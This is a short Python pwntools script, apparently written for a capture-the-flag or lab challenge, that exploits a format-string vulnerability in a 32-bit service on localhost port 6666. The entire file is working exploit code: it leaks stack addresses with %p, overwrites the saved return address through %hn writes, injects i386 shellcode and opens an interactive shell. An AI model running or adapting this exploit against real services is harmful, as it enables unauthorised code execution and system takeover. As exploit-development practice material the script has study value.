from pwn import *
#print '{0!s}'.format(addr) # {0!s} first argument 0, calls str() on it first

context.log_level = 'info'
H,P='localhost',6666
fmt_param_num = 4
bufaddr = 0x0804A080
junk = ''
r = remote(H,P)

r.sendline('%'+str(fmt_param_num)+'$p')
ebpaddr = int(r.recvline(),16)
ripaddr = ebpaddr + 4
junk+=r.recvline() # another newline after each puts

r.sendline('%'+str(12)+'$p')
ebpcont = int(r.recvline(),16)
junk+=r.recvline() # another newline after each puts

log.info('   ebp addr: %x' % ebpaddr)
log.info('   rip addr: %x' % ripaddr)
log.info('   ebp cont: %x' % ebpcont)

bytes2print = ripaddr & 0xFFFF
log.info('w 2b short rip [%x] to ebp cont [%x] to create rip [%x]...' % (bytes2print,ebpcont,ripaddr))
out = '%.{0!s}u%{1!s}$hn'.format(bytes2print,4)
r.sendline(out)
junk+=r.recvline()

log.info('Check for written ebp cont. Remember ebp cont must now be rip')
r.sendline('%'+str(fmt_param_num)+'$p')
ebpcont_check = int(r.recvline(),16)
junk+=r.recvline()
log.info('   ebp cont check: %x' % ebpcont_check)

log.info('w buf addr [%x] to rip [%x]...' % (bufaddr,ripaddr))
bufaddroffset = bufaddr & 0xFFFF
out = '%.{0!s}u%{1!s}$hn'.format(bufaddroffset,12)
shellcode = asm(shellcraft.i386.linux.sh())
r.sendline(shellcode+'%.{0!s}u%{1!s}$hn'.format(bufaddroffset-len(shellcode),12)) # why minus len(sh)?
junk+=r.recvline()
log.info('Enjoy your shell!')
r.interactive()
